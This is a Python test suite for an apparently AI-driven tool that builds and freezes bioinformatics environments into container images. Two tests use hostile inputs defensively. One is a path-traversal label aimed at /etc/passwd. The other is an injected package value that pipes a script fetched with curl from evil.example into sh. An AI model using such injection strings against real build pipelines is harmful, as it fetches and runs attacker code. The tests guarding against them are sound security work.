    from agent.skills.job_manager import JobManager
    jm = JobManager({"paths": {"conda_envs_prefix": str(tmp_path)}})
    # Redirect jobs_dir into the test tmp_path so we don't pollute the real one
    jm.jobs_dir = tmp_path
    tmp_path.mkdir(parents=True, exist_ok=True)
    # Long-running job that won't have exited by the time we check
    out = jm.start("sleep 5", job_id="n6_running")
    # immediately after start, status.json exists but .done MUST NOT
    assert (tmp_path / "n6_running.status.json").exists()
    assert not (tmp_path / "n6_running.done").exists(), (
        ".done sentinel must NOT exist while the job is still running")
    # Cancel so we don't actually wait 5s
    jm.cancel("n6_running")


def test_freeze_background_response_advertises_done_marker(monkeypatch, tmp_path):
    """N6 (end-to-end) — the freeze(background=True) response advertises the
    `done_marker` path so the polling agent has a deterministic file to
    watch (instead of misreading status.json as the completion signal)."""
    import agent.mcp_server as ms

    def _stub_start(command, *, env_name="", job_id="", working_dir=""):
        return {"job_id": job_id, "log_path": "/dev/null", "state": "running"}
    monkeypatch.setattr(ms._job_manager, "start", _stub_start)
    monkeypatch.setattr(ms._env_mgr, "project_root", tmp_path)
    out = ms.freeze(env_name="n6_smoke", tools=["t=1"], background=True)
    assert "done_marker" in out, (
        "freeze background response must advertise the .done sentinel path")
    assert out["done_marker"].endswith(".done")


def test_freeze_installed_packages_move_to_end_dedup_on_retry():
    """Dedup is MOVE-TO-END, not last-wins-in-place: a later install_step that
    provides a package already seen REMOVES the prior entry and inserts the new
    one at the end. Iteration order = the order successful retries actually
    happened, which is what the build replay needs (a retry of GAPIT after
    snpStats was installed must come AFTER snpStats in the replay).

    successful_only=True still works as an optional filter (used by callers
    that genuinely want only-successful steps for reporting); but the dedup
    semantic does the load-bearing work regardless of filter."""
    from agent.skills.freeze import installed_packages

    spec = {"install_steps": [
        {"step": 1, "tool": "Rscript", "returncode": 1,
         "installed_packages": [{"name": "GAPIT", "version": None,
                                 "install_method": {"type": "r_install",
                                                    "source": "remotes::install_github('jiabowang/GAPIT')"}}]},
        {"step": 2, "tool": "Rscript", "returncode": 0,
         "installed_packages": [{"name": "snpStats", "version": "1.60.0",
                                 "install_method": {"type": "r_install",
                                                    "source": "BiocManager::install('snpStats')"}}]},
        {"step": 3, "tool": "Rscript", "returncode": 0,
         "installed_packages": [{"name": "GAPIT", "version": "4.1.0",
                                 "install_method": {"type": "r_install",
                                                    "source": "remotes::install_github('jiabowang/GAPIT')"}}]},
    ]}

    # Default (no filter) — both entries deduped, GAPIT entry from step 3 wins
    # (last-wins on value), AND its POSITION is step 3's (move-to-end).
    pkgs = installed_packages(spec)
    names_in_order = [p["name"] for p in pkgs]
    assert names_in_order == ["snpStats", "GAPIT"], \
        f"move-to-end dedup must place GAPIT AFTER snpStats; got {names_in_order}"
    by_name = {p["name"]: p for p in pkgs}
    assert by_name["GAPIT"]["version"] == "4.1.0", \
        "the value at the GAPIT key must come from the successful step 3, not the failed step 1"

    # successful_only=True option still works: failed step skipped, same result.
    succ = installed_packages(spec, successful_only=True)
    assert [p["name"] for p in succ] == ["snpStats", "GAPIT"]


def test_non_conda_installs_does_not_filter_failed_steps_for_adopt_decision():
    """REGRESSION test for the mosdepth trust violation: a release-binary
    install whose host verify fails (wrong-arch linux binary on a Mac host)
    has rc != 0 but is STILL a non-conda install. non_conda_installs MUST
    include it so the freeze adopt-vs-build decision sees it and refuses to
    adopt a biocontainer (which would silently ship a different version of
    the tool than what was anchored).

    The fix: non_conda_installs no longer filters by returncode. Move-to-end
    dedup handles the retry case without needing a filter — a successful
    retry naturally supersedes a failed earlier attempt for the same package."""
    from agent.skills.freeze import non_conda_installs

    # Exact shape of the mosdepth stress-test failure:
    # install_release_binary on osx-arm64 downloads the linux/amd64 binary
    # successfully, sha256-anchors it, places the wrapper — but the post-install
    # `mosdepth --version` verify fails because the host can't execute a linux
    # binary. The install_step records rc=1.
    spec = {"install_steps": [
        {"step": 1, "tool": "conda", "subcommand": "create", "returncode": 0,
         "installed_packages": [{"name": "python", "version": "3.11",
                                 "install_method": {"type": "conda"}}]},
        {"step": 2, "tool": "release_binary", "returncode": 1,    # <-- the host-verify-failed case
         "installed_packages": [{"name": "mosdepth",
                                 "install_method": {"type": "binary",
                                                    "binary_url": "https://github.com/brentp/mosdepth/releases/download/v0.3.14/mosdepth",
                                                    "sha256": "c5182b74a8f1b66710efa16e122cbc8a197834874b103e7c5c0bd9a6265ae7b6"}}]},
    ]}

    nc = non_conda_installs(spec)
    nc_names = {x["name"] for x in nc}
    assert "mosdepth" in nc_names, \
        ("non_conda_installs must include the wrong-arch binary install "
         "(rc=1 from host verify) — otherwise freeze adopts a biocontainer "
         "and silently ships a DIFFERENT version than the user anchored. "
         "Trust violation.")
    # Type is binary so the freeze build path replays it inside the container.
    m = next(x for x in nc if x["name"] == "mosdepth")
    assert m["type"] == "binary"
    assert m["install_method"]["sha256"] == \
        "c5182b74a8f1b66710efa16e122cbc8a197834874b103e7c5c0bd9a6265ae7b6"

    # The corollary: freeze.py's adopt-or-build decision uses non_conda_installs
    # (mcp_server.freeze: `if can_adopt and not non_conda: ADOPT else BUILD`).
    # With mosdepth in non_conda, `not non_conda` is False → BUILD path taken.
    # Without this fix (the prior successful_only=True filter), nc was empty
    # and adopt was taken → bug.


def test_install_r_package_surfaces_missing_packages_on_failure(monkeypatch):
    """When R install fails, parse stderr for missing-package signals and
    surface them as a structured `missing_packages: [...]` field so the
    autonomy loop doesn't have to grep error text. R produces two distinct
    shapes both meaning 'install X then retry me': `Package 'X' not available
    after install attempt` (BiocManager dep resolution) and `there is no
    package called 'X'` (lazy-load failure during R CMD INSTALL byte-compile).
    Both must be captured. The package WE were trying to install is NOT
    in missing_packages — its own load-or-die already telegraphs that."""
    import agent.mcp_server as m

    # Simulate the exact stderr shape we see in the wild from a failed
    # remotes::install_github('jiabowang/GAPIT') when snpStats is missing.
    fake_stderr = (
        "Using GitHub PAT from the git credential store.\n"
        "Downloading GitHub repo jiabowang/GAPIT@HEAD\n"
        "Running `R CMD build`...\n"
        "* installing *source* package 'GAPIT' ...\n"
        "** byte-compile and prepare package for lazy loading\n"
        "ERROR: lazy loading failed for package 'GAPIT'\n"
        "Bioconductor version 3.22 (BiocManager 1.30.27), R 4.5.3 (2026-03-11)\n"
        "Installing package(s) 'BiocVersion', 'snpStats'\n"
        "Warning: packages 'BiocVersion', 'snpStats' are not available for Bioconductor version '3.22'\n"
        "Error : Package 'snpStats' not available after install attempt.\n"
        "Error: unable to load R code in package 'GAPIT'\n"
        "Execution halted\n"
    )
    monkeypatch.setattr(m._env_mgr, "run_in_env",
        lambda env, cmd, timeout=1800: {"returncode": 1, "stdout": "", "stderr": fake_stderr,
                                         "success": False, "command": cmd})

    res = m.install_r_package(env_name="x", name="GAPIT",
                               source="github:jiabowang/GAPIT", pipeline_id="")
    assert res["returncode"] == 1
    assert res.get("missing_packages") == ["snpStats"], \
        f"expected ['snpStats']; got {res.get('missing_packages')!r}"

    # The other failure shape: `there is no package called 'X'` (lazy-load).
    fake_stderr_loadfail = (
        "Error in loadNamespace(j <- i[[1L]], c(lib.loc, .libPaths()), versionCheck = vI[[j]]) : \n"
        "  there is no package called 'multtest'\n"
        "Calls: <Anonymous> ... loadNamespace -> withRestarts -> withOneRestart -> doWithOneRestart\n"
        "Execution halted\n"
    )
    monkeypatch.setattr(m._env_mgr, "run_in_env",
        lambda env, cmd, timeout=1800: {"returncode": 1, "stdout": "", "stderr": fake_stderr_loadfail,
                                         "success": False, "command": cmd})
    res2 = m.install_r_package(env_name="x", name="GAPIT",
                                source="github:jiabowang/GAPIT", pipeline_id="")
    assert res2.get("missing_packages") == ["multtest"]

    # The package WE were installing must NOT appear in missing_packages even
    # if its name appears in the load-or-die failure line.
    self_fail = (
        "trying to install GAPIT\n"
        "Error: install reported success but GAPIT is not loadable\n"
        # if R also said "there is no package called 'GAPIT'" we'd EXCLUDE GAPIT itself
        "Error in library(GAPIT) : there is no package called 'GAPIT'\n"
    )
    monkeypatch.setattr(m._env_mgr, "run_in_env",
        lambda env, cmd, timeout=1800: {"returncode": 1, "stdout": "", "stderr": self_fail,
                                         "success": False, "command": cmd})
    res3 = m.install_r_package(env_name="x", name="GAPIT",
                                source="github:jiabowang/GAPIT", pipeline_id="")
    assert "GAPIT" not in (res3.get("missing_packages") or []), \
        "the package being installed must not appear in its own missing_packages list"

    # Successful install: no missing_packages field (only set on failure).
    monkeypatch.setattr(m._env_mgr, "run_in_env",
        lambda env, cmd, timeout=1800: {"returncode": 0, "stdout": "1.0.0\n", "stderr": "",
                                         "success": True, "command": cmd})
    res4 = m.install_r_package(env_name="x", name="ape",
                                source="cran", pipeline_id="")
    assert "missing_packages" not in res4 or not res4.get("missing_packages")


def test_shrink_stdio_for_response_truncates_to_head_tail_spills_full_to_disk(monkeypatch, tmp_path):
    """Efficiency #1: stdout/stderr in the MCP response are capped at head+tail
    while the FULL bytes are preserved on disk at log_path. The agent reads the
    log if it needs the full diagnostic. Truth surface (install_step record,
    EnvCache record, env_reports/*.md/html, attestation, recipe) is NEVER
    touched by this helper — it's pure response-shape sugar. Below the
    shrink threshold the result passes through untouched."""
    import agent.mcp_server as m
    monkeypatch.setattr(m._env_mgr, "project_root", tmp_path)

    # Small output passes through with NO log file and NO truncation flags.
    small = {"stdout": "ok\n", "stderr": "", "returncode": 0, "command": "noop"}
    s = m._shrink_stdio_for_response(dict(small), label="t.small")
    assert s["stdout"] == "ok\n" and s["stderr"] == ""
    assert "log_path" not in s and "log_truncated" not in s

    # Large output: response is truncated, full log on disk.
    big_stdout = "x" * 30000   # well over the 5000-char SHRINK_OVER threshold
    big_stderr = "Error at file " + "y" * 20000 + "\nfinal-error-message-must-survive"
    big = {"stdout": big_stdout, "stderr": big_stderr,
           "returncode": 1, "command": "Rscript -e 'big'"}
    r = m._shrink_stdio_for_response(dict(big), label="t.big.compile")

    # The response is bounded — no longer 50k chars.
    assert len(r["stdout"]) < len(big_stdout)
    assert len(r["stderr"]) < len(big_stderr)
    # head + tail of stdout preserved.
    assert r["stdout"].startswith("xxx")     # leading kept
    # critical: the LAST line of stderr (where the actual error usually lives)
    # MUST survive truncation. This is the load-bearing property.
    assert "final-error-message-must-survive" in r["stderr"], \
        "tail-keep must preserve the final error message"
    # flags + log_path are set so the caller knows the response was shrunk.
    assert r["log_truncated"] is True
    assert r["original_log_chars"] == len(big_stdout) + len(big_stderr)
    # log_path exists on disk and contains the FULL output verbatim.
    log_path = tmp_path / "env_reports" / "install_logs"
    files = list(log_path.glob("t.big.compile.*.log"))
    assert len(files) == 1, f"expected 1 log file; got {files}"
    log_content = files[0].read_text()
    assert big_stdout in log_content                  # full stdout preserved
    assert big_stderr in log_content                  # full stderr preserved
    assert "Rscript -e 'big'" in log_content          # command preserved
    assert "RETURNCODE === 1" in log_content          # rc preserved


def test_shrink_stdio_for_response_handles_unsafe_label_chars(monkeypatch, tmp_path):
    """Label sanitization: arbitrary names (package names with / or .)
    must not create paths that traverse out of the log dir."""
    import agent.mcp_server as m
    monkeypatch.setattr(m._env_mgr, "project_root", tmp_path)
    big = {"stdout": "x" * 10000, "stderr": "", "returncode": 0, "command": ""}
    # Path-traversal attempts in label must be sanitized.
    m._shrink_stdio_for_response(dict(big), label="../../../etc/passwd")
    log_path = tmp_path / "env_reports" / "install_logs"
    # No file created outside the log dir.
    assert not (tmp_path / "etc" / "passwd").exists()
    # Every file created lives strictly inside log_path.
    for f in log_path.iterdir():
        assert log_path in f.resolve().parents or f.parent == log_path


def test_summarize_sbom_in_response_keeps_full_in_record_summarizes_in_response():
    """Efficiency #2: the freeze RESPONSE replaces resolved_packages +
    system_packages with summary fields, but the original SBOM stays in the
    EnvCache record (which env_report_html / attestation read from). This is
    the rule: disk is the truth surface; the response is just what fits
    comfortably in the agent's context."""
    import agent.mcp_server as m
    # Build a record matching what freeze() would have stored: 3 conda
    # packages including GAPIT 4.1.0, plus 2 apt packages.
    rec = {
        "name": "demo", "image": "demo:latest",
        "requested_tools": ["GAPIT"],
        "resolved_packages": [
            {"name": "r-base", "version": "4.5.3", "kind": "conda"},
            {"name": "GAPIT",  "version": "4.1.0", "kind": "conda"},
            {"name": "zlib",   "version": "1.3.2", "kind": "conda"},
        ],
        "system_packages": [
            {"name": "libc6", "version": "2.36-9+deb12u14", "kind": "apt"},
            {"name": "openssl", "version": "3.0.20-1~deb12u1", "kind": "apt"},
        ],
        "env_report_html": "/path/to/env_reports/demo.ENV.html",
    }
    out = m._summarize_sbom_in_response(dict(rec))

    # Response has SUMMARY, not the bulky lists.
    assert "resolved_packages" not in out, \
        "resolved_packages must be dropped from the response (preserved in cache record)"
    assert "system_packages" not in out
    assert out["resolved_packages_summary"]["count"] == 3
    assert out["system_packages_summary"]["count"] == 2
    # Primary tool resolution is the load-bearing bit and stays inline.
    assert out["resolved_packages_summary"]["primary_tools_resolved"] == {"GAPIT": "4.1.0"}
    # sbom_full_in_report points the agent at the on-disk full SBOM (HTML).
    assert out["sbom_full_in_report"] == "/path/to/env_reports/demo.ENV.html"

    # CRITICAL: the original record passed IN is mutated (response only),
    # but the helper takes a dict(rec) copy at the call site so the cached
    # record stays intact. Verified the contract here: the helper itself
    # only modifies its argument; freeze.py passes a SHALLOW COPY via {...}
    # spread before calling, so the cache is safe.
    # Demonstrate: a fresh untouched record retains the full lists.
    assert len(rec["resolved_packages"]) == 3 and len(rec["system_packages"]) == 2

    # Primary-tool not found in resolved → not listed, doesn't error.
    rec_no_match = {"requested_tools": ["NotInstalled"],
                    "resolved_packages": [{"name": "x", "version": "1", "kind": "conda"}],
                    "system_packages": []}
    out2 = m._summarize_sbom_in_response(dict(rec_no_match))
    assert out2["resolved_packages_summary"]["primary_tools_resolved"] == {}

    # Empty SBOM (cache miss / minimal record): doesn't crash.
    out3 = m._summarize_sbom_in_response({"requested_tools": []})
    assert out3["resolved_packages_summary"]["count"] == 0
    assert out3["system_packages_summary"]["count"] == 0


def test_freeze_response_truth_surface_unchanged_by_sbom_summarization():
    """Lock the contract: when the freeze response summarizes the SBOM, the
    EnvCache record on disk + env_report_html render input MUST still have the
    full lists. The summarization happens AFTER cache.register and AFTER
    report render — verified by simulating the full pipeline."""
    import agent.mcp_server as m
    from agent.skills.freeze import EnvCache

    # Simulate the freeze-time flow: build a record with full SBOM, register
    # it in a cache, render reports from the record, THEN summarize for the
    # response. Order matters — the docstring of _summarize_sbom_in_response
    # makes this explicit.
    rec = {
        "name": "ordering_test", "image": "x:latest", "requested_tools": ["mytool"],
        "resolved_packages": [{"name": "mytool", "version": "1.0", "kind": "conda"}] * 50,
        "system_packages": [{"name": "libc6", "version": "2.36", "kind": "apt"}] * 30,
    }
    # 1. Register cache from the full record (this is what freeze does at
    #    line 2306 _env_cache.register(rkey, record) BEFORE response build).
    import tempfile, pathlib, json
    with tempfile.TemporaryDirectory() as td:
        cache = EnvCache(pathlib.Path(td) / "_env_cache.json")
        cache.register("test_key", rec)
        # 2. Build response and summarize (what freeze does at the very end).
        response = m._summarize_sbom_in_response(dict(rec))
        # The response has summaries.
        assert "resolved_packages" not in response
        # 3. The cache record on disk STILL has the full SBOM — that's the
        #    contract. env_report_html and attestation read from this.
        cached = cache.lookup("test_key")
        assert len(cached["resolved_packages"]) == 50, \
            "cache record must keep the full resolved_packages list"
        assert len(cached["system_packages"]) == 30, \
            "cache record must keep the full system_packages list"


def test_pixi_engine_add_pypi_and_micromamba_refuses():
    """PixiEngine.add_pypi → `pixi add --pypi` (into the lock); MicromambaEngine
    refuses honestly (its explicit lock can't capture pip)."""
    from agent.skills.container_build import PixiEngine, MicromambaEngine
    calls = []
    class FakeCB:
        def exec(self, cmd, timeout=0):
            calls.append(cmd); return {"returncode": 0, "stdout": "", "stderr": ""}
    assert PixiEngine().add_pypi(FakeCB(), ["cyvcf2==0.31.1"])["success"]
    assert any("pixi add --pypi" in c and "cyvcf2==0.31.1" in c for c in calls)
    r = MicromambaEngine().add_pypi(FakeCB(), ["cyvcf2"])
    assert r["success"] is False and "pip" in r["reason"].lower()


def test_envbuild_add_pip_records_engine_coupled_verification():
    from agent.skills.env_build import EnvBuild
    eb = EnvBuild("demo", "1.0")
    eb.add_pip(["cyvcf2==0.31.1"], verify=[("cyvcf2", "pip show cyvcf2")])
    assert eb.pip_specs == ["cyvcf2==0.31.1"]
    v = eb.verifications[-1]
    assert v["tool"] == "cyvcf2" and v["engine_coupled"] is True
    assert "cyvcf2=0.31.1" in eb.request_key()   # pip specs feed the lookup handle (== normalized to =)


def test_env_freeze_maps_pip_and_r_install():
    """env_freeze routes r_install -> r_package generator (source reconstructed from
    the recorded R expr) and injects the R toolchain; pip is partitioned to add_pip."""
    from agent.skills import env_freeze as ef
    # r_install mapping: source reconstructed from install_method.source expr
    r = ef._map_install({"name": "ape", "type": "r_install",
                         "install_method": {"type": "r_install", "source": "install.packages('ape')"}})
    assert r["spec"]["tool"] == "ape" and 'install.packages("ape"' in r["spec"]["command"]
    rg = ef._map_install({"name": "treedater", "type": "r_install",
                          "install_method": {"source": "remotes::install_github('emvolz/treedater')"}})
    assert 'install_github("emvolz/treedater",dependencies=FALSE)' in rg["spec"]["command"]
    # plan_conda injects the R toolchain (r-base + compilers)
    out = ef.plan_conda([], [{"type": "r_install"}])
    assert "r-base" in out and "fortran-compiler" in out
    # zlib lives in the R toolchain because source-compiled Bioc/CRAN packages that
    # work with compressed data (snpStats: -lz for read_uncertain.c; many htslib-
    # adjacent R packages) #include <zlib.h>. Without it the container build fails
    # at the install step with a "zlib.h: No such file or directory" hard-error.
    assert "zlib" in out
    # pip is NOT a generator (no toolchain injected for it)
    assert ef.plan_conda([], [{"type": "pip"}]) == []


def test_mcp_freeze_repoint_drives_container_native_builder(monkeypatch, tmp_path):
    """C4 wiring (the gap that was py_compile-only): the re-pointed freeze, on a draft
    with a non-conda install, takes the container-native branch — calls
    env_freeze.build_env_image with conda_deps from requested_conda_specs + the docker
    platform + primary_tools, and maps the result to a build/container-native
    freeze_record registered in the EnvCache. (The build is live-proven separately;
    this proves the FACE wiring deterministically — no docker.)"""
    import agent.mcp_server as m
    draft = {"install_steps": [
        {"tool": "conda", "subcommand": "install",
         "installed_packages": [{"name": "samtools", "version": "1.21",
                                 "install_method": {"type": "conda"}}]},
        {"tool": "install_release_binary", "subcommand": "install",
         "installed_packages": [{"name": "seqkit", "version": "2.13.0",
                                 "install_method": {"type": "binary",
                                                    "binary_url": "https://x/seqkit_darwin_arm64.tar.gz",
                                                    "local_path": "/h/seqkit"}}]},
    ]}
    monkeypatch.setattr(m._pipeline_state, "get_draft", lambda pid: draft)
    monkeypatch.setattr(m._biocontainers, "resolve_biocontainer", lambda parsed: {"found": False})
    monkeypatch.setattr(m._env_cache, "lookup", lambda k: None)
    # Patch the I/O (`_save`), NOT the contract (`register`). A lambda standing in for
    # `register` accepts ANY dict, which patches out the one gate that asserts a record's
    # shape — the fix location and the monkeypatch location were the same line. The real
    # `register` now runs (and validates) while nothing touches disk.
    registered: dict = {}
    monkeypatch.setattr(m._env_cache, "_load", lambda: registered)
    monkeypatch.setattr(m._env_cache, "_save", lambda data: None)
    monkeypatch.setattr(m._env_mgr, "generate_lock", lambda *a, **k: {"success": False})
    monkeypatch.setattr(m._docker, "save_archive", lambda img, path: {"success": False})
    monkeypatch.setattr(m._docker, "image_digest", lambda img: "")
    captured = {}
    def fake_build(spec, **kw):
        captured["spec"], captured["kw"] = spec, kw
        return {"success": True, "image": "samtools-seqkit:latest", "image_digest": "sha256:deadbeef",
                "content_digest": "sha256:cd",
                # the real builder returns in-image evidence; a stub that returns none
                # produces a record the honesty contract refuses (VALIDATED_IN_IMAGE),
                # which is correct behaviour and would make this a test of the stub.
                "verifications": [
                    {"label": "samtools", "tool": "samtools", "check": "command -v samtools",
                     "rc": 0, "passed": True, "out": "/opt/conda/bin/samtools"},
                    {"label": "seqkit", "tool": "seqkit", "check": "command -v seqkit",
                     "rc": 0, "passed": True, "out": "/opt/conda/bin/seqkit"}],
                # matches what env_build really emits: `tool` alongside the prose
                # `purpose` and the shell `command` (they are three different things)
                "longtail_steps": [{"tool": "seqkit", "purpose": "seqkit (release binary)",
                                    "command": "set -eux; curl ..."}]}
    monkeypatch.setattr(m._env_freeze, "build_env_image", fake_build)
    monkeypatch.setattr(m._env_mgr, "project_root", tmp_path)   # deliverables -> tmp, not the real env_reports/

    res = m.freeze("bioinf_x", ["samtools=1.21", "seqkit"], platform="linux-64", pipeline_id="p1")

    assert res["success"] and res["mode"] == "build" and res["build_method"] == "container-native"
    assert res["image"] == "samtools-seqkit:latest" and res["image_digest"] == "sha256:deadbeef"
    # the re-point derived the right args for the container-native builder
    assert captured["kw"]["conda_deps"] == ["samtools=1.21"]      # requested_conda_specs (no bootstrap python)
    assert captured["kw"]["platform"] == "linux/amd64"            # converted from the conda subdir linux-64
    assert set(captured["kw"]["primary_tools"]) == {"samtools", "seqkit"}
    assert captured["spec"] is draft
    # registered in the cache; shipped_binaries NAME the tool and carry its baked
    # command in a separate field. This assertion used to read `name`, matching prose
    # against a key the other producer never wrote — see test_shipped_binary_contract.
    assert registered
    sb = [x for x in res.get("shipped_binaries", []) if x["tool"] == "seqkit"]
    assert sb and sb[0]["install_command"].startswith("set -eux; curl")
    assert sb[0]["provenance"] == "seqkit (release binary)"


# ---------------------------------------------------------------------------
# Declarative builder: resolve -> route -> EnvBuild, straight from tool NAMES
# (no host install). The container-native "call once per tool" entry point.
# ---------------------------------------------------------------------------

def test_container_native_multistage_runtime_provisions_jar_jre():
    """Phase D: a tool's wrapper may need an interpreter at RUNTIME. The runtime stage
    adds exactly the packages the recorded steps DECLARE in `runtime_packages` (lean
    images stay lean).

    This test used to assert the prose rule (`purpose.endswith("(java jar)")`) and so
    pinned the defect by construction: its step dict carried only {command, purpose}.
    Under that rule ONLY the jar tier could earn a JRE, while a java tool arriving via
    synthesized / script_repo / release_binary — an snpEff or Trimmomatic zip is
    precisely that shape — installed its JRE into the builder and then shipped a
    runtime image with no /usr/bin/java. Cases (b) and (c) below are the two halves
    that keep the string rule from creeping back."""
    from agent.skills.container_build import emit_dockerfile, PixiEngine

    def _runtime(steps):
        df = emit_dockerfile("debian:bookworm-slim", engine=PixiEngine(),
                             has_env_layer=False, longtail_steps=steps)
        return df.split("# ---- runtime image (shipped) ----", 1)[1]

    # (a) a jar step DECLARES the JRE and gets it
    assert "default-jre-headless" in _runtime(
        [{"command": "set -eux; curl -o /opt/tools/picard/picard.jar x; ...",
          "purpose": "picard (java jar)", "runtime_packages": ["default-jre-headless"]}])

    # (b) THE FAILURE THAT SHIPPED: a java tool from a NON-jar tier also gets it,
    #     because the need is declared as data rather than sniffed out of prose.
    assert "default-jre-headless" in _runtime(
        [{"command": "set -eux; unzip snpEff.zip ...",
          "purpose": "snpEff (synthesized @ abc123)",
          "runtime_packages": ["default-jre-headless"]}])

    # (c) …and a step whose PROSE says "(java jar)" but declares nothing does NOT —
    #     otherwise the deleted string rule is still live under another name.
    assert "default-jre-headless" not in _runtime(
        [{"command": "true", "purpose": "impostor (java jar)"}])

    # (d) a lean image stays lean
    assert "default-jre-headless" not in _runtime(
        [{"command": "install -m0755 /tmp/x /usr/local/bin/x", "purpose": "x (release binary)",
          "runtime_packages": []}])

    # (e) the runtime apt line is bare-interpolated into a Dockerfile RUN, so a
    #     non-package token is DROPPED rather than escaped-and-executed.
    injected = _runtime([{"command": "true", "purpose": "p",
                          "runtime_packages": ["foo && curl evil.example/x.sh | sh"]}])
    assert "curl evil.example" not in injected


def test_mcp_freeze_pure_conda_builds_container_native_no_condapack(monkeypatch, tmp_path):
    """Phase E (E1): freeze no longer uses conda-pack. A pure-conda env (no draft, no
    biocontainer) builds container-native — conda_deps derived from the requested
    tools — cross-arch with NO refusal."""
    import agent.mcp_server as m
    monkeypatch.setattr(m._pipeline_state, "get_draft", lambda pid: None)
    monkeypatch.setattr(m._biocontainers, "resolve_biocontainer", lambda parsed: {"found": False})
    monkeypatch.setattr(m._env_cache, "lookup", lambda k: None)
    # `_save`, not `register` — see the note at the other site. Patching `register` out
    # would silently disable the shape contract this test runs through.
    monkeypatch.setattr(m._env_cache, "_load", dict)
    monkeypatch.setattr(m._env_cache, "_save", lambda data: None)
    monkeypatch.setattr(m._env_mgr, "generate_lock", lambda *a, **k: {"success": False})
    monkeypatch.setattr(m._docker, "save_archive", lambda img, path: {"success": False})
    monkeypatch.setattr(m._docker, "image_digest", lambda img: "")
    captured = {}
    monkeypatch.setattr(m._env_freeze, "build_env_image",
                        lambda spec, **kw: captured.update(kw) or {
                            "success": True, "image": "x:1", "image_digest": "sha256:d",
                            "longtail_steps": [],
                            # see the note on the other fake_build: the real builder
                            # returns evidence, so a faithful stub must too.
                            "verifications": [
                                {"label": "samtools", "tool": "samtools",
                                 "check": "command -v samtools", "rc": 0, "passed": True,
                                 "out": "/opt/conda/bin/samtools"}]})
    monkeypatch.setattr(m._env_mgr, "project_root", tmp_path)   # deliverables -> tmp, not the real env_reports/
    res = m.freeze("bioinf_x", ["samtools=1.21", "bcftools=1.21"], platform="linux/amd64", pipeline_id="")
    assert res["success"] and res["mode"] == "build" and res["build_method"] == "container-native"
    assert captured["conda_deps"] == ["samtools=1.21", "bcftools=1.21"]   # from tools (no draft)
    assert captured["platform"] == "linux/amd64" and captured["license_gated"] is False


# ---------------------------------------------------------------------------
# GAB shakeout fixes — real-world half-baked academic install robustness
# (baumannlab/Genome_Assembly_Booster: sci-python co-solve + run-by-path repo)
# ---------------------------------------------------------------------------

def test_ensure_python_for_pip_injects_interpreter():
    """pip via the engine (pixi --pypi/uv) needs python IN the env; inject it when
    no conda package provides one (the pip analog of toolchain injection)."""
    from agent.skills import env_freeze as ef
    assert "python" in ef.ensure_python_for_pip(["r-base"], True)        # pip + no python -> injected
    assert ef.ensure_python_for_pip(["python=3.12"], True) == ["python=3.12"]  # explicit python kept, no dupe
    assert ef.ensure_python_for_pip(["python"], True) == ["python"]
    assert ef.ensure_python_for_pip(["r-base"], False) == ["r-base"]     # no pip -> untouched
    out = ef.ensure_python_for_pip(["python-louvain"], True)             # python-foo is NOT python
    assert "python" in out and out != ["python-louvain"]


def test_conda_presence_check_validates_libraries_honesty_safe():
    """Library-only conda packages (no CLI) validate via installed dist-metadata,
    NOT command -v. The check still NAMES the package, so env_honesty's anti-cheat
    shape rule accepts it — and a bare `import community` (name != package) is still
    rejected, proving the guarantee isn't weakened."""
    from agent.skills import env_freeze as ef
    from agent.skills import env_honesty as eh
    chk = ef._conda_presence_check("python-louvain")
    assert "command -v python-louvain" in chk and "distribution('python-louvain')" in chk
    assert eh.evidence_shape_violation(chk, "python-louvain") is None          # accepted (names the token)
    assert eh.evidence_shape_violation('python -c "import community"', "python-louvain") is not None  # cheat-shape still caught


def test_map_install_routes_run_by_path_to_script_repo():
    """A clone-and-run script collection (entrypoint, no compiled binary) is
    replayable via the script_repo generator; without entrypoint OR build/bin_path
    it's still refused."""
    from agent.skills import env_freeze as ef
    m = ef._map_install({"name": "gab", "type": "source", "install_method": {
        "type": "source", "source": "https://github.com/x/gab", "commit_sha": "abc",
        "entrypoint": "HIC_ASSEMBLER/run_hicAssembler.py", "interpreter": "python"}})
    assert "spec" in m and "error" not in m
    cmd = m["spec"]["command"]
    assert "_swh_clone" in cmd and "run_hicAssembler.py" in cmd and "/usr/local/bin/gab" in cmd
    bad = ef._map_install({"name": "gab", "type": "source", "install_method": {
        "type": "source", "source": "https://github.com/x/gab", "commit_sha": "abc"}})
    assert "error" in bad


def test_resolver_filters_serial_version_anomaly():
    """An abandoned date/serial 'version' (bioconda hmmlearn's 20151031) must not
    masquerade as latest — picked over the real semver only if nothing else parses."""
    from agent.skills import resolver as r
    assert r._looks_like_serial("20151031")
    assert not r._looks_like_serial("0.3.3") and not r._looks_like_serial("2026.4.0")  # CalVer ok
    assert r._pick_latest(["20151031", "0.1.1"]) == "0.1.1"
    assert r._pick_latest(["0.2.0", "0.3.3", "0.3.2"]) == "0.3.3"
    assert r._pick_latest(["20151031"]) == "20151031"   # all-serial -> still resolves


def test_runtime_image_is_self_activating_env_on_path():
    """GAB fix #5: the shipped runtime image must bake the conda env onto PATH so
    `apptainer exec image <tool>` / plain `docker run image <tool>` reach the conda
    tools + python directly (not only via `pixi run`). Without this every conda
    tool — and a run-by-path wrapper's `python` — 404s under the HPC delivery."""
    from agent.skills.container_build import PixiEngine, MicromambaEngine
    pix = "\n".join(PixiEngine().runtime_lines())
    assert "/work/.pixi/envs/default/bin" in pix and "ENV PATH" in pix and "CONDA_PREFIX" in pix
    mam = "\n".join(MicromambaEngine().runtime_lines())
    assert "/opt/micromamba/envs/env/bin" in mam and "ENV PATH" in mam and "CONDA_PREFIX" in mam


# ---------------------------------------------------------------------------
# BANNER-PROBE NON-FAKEABILITY — the version-cell honesty contract.
# The probe captures the shipped tool's self-reported version BANNER without
# letting the agent influence what gets run or what gets accepted. These tests
# guard the seams that make it non-fakeable: the probe command is synthesized
# from a sanitized tool token only, an unsafe token is skipped (no banner) instead
# of risking shell injection, and the renderer accepts only version-shaped tokens
# extracted from the captured stdout.
# ---------------------------------------------------------------------------

def test_validate_in_image_probe_command_uses_only_tool_token(monkeypatch):
    """The banner probe is synthesized inside container_build from the tool token
    alone — no agent text reaches the shell. Capture every docker invocation and
    assert each probe is `<tool> --version` / bare `<tool>`, nothing else."""
    from agent.skills import container_build as cb
    cb_inst = cb.ContainerBuild.__new__(cb.ContainerBuild)
    cb_inst.platform = "linux/amd64"
    cb_inst.workdir = "/work"
    invocations = []

    def fake_sh(argv, timeout=300):
        invocations.append(argv)
        return {"returncode": 0, "stdout": "Version: 1.4-r122\n", "stderr": ""}

    cb_inst._sh = fake_sh
